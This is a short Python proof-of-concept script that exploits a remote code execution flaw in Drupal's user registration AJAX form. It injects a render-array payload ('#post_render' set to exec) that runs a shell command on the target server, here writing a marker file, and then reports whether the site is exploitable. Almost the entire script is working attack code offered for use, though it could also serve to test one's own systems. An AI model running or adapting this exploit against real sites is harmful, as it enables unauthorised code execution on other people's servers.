#!/usr/bin/env python3
import sys
import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('url', help='Get the URL, ex: https://www.google.com', type=str)
args = parser.parse_args()
url = args.url

# Normalize the input
if url[0:4] != "http":
    url = 'http://' + url
    print("Prepending 'http://' to the url given")

if url[-1] != '/':
    url = url + '/'

# Check if url given is valid
r = requests.head(url)
if r.status_code is not requests.codes.ok:
    sys.exit("Not a valid URL")

exploit_path = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
target = url + exploit_path

payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo ":p" | tee hello.txt'}

r = requests.post(target, data=payload)
if r.status_code != 200:
    sys.exit("Target is not exploitable")
print('\nCheck: ' + target + 'hello.txt')
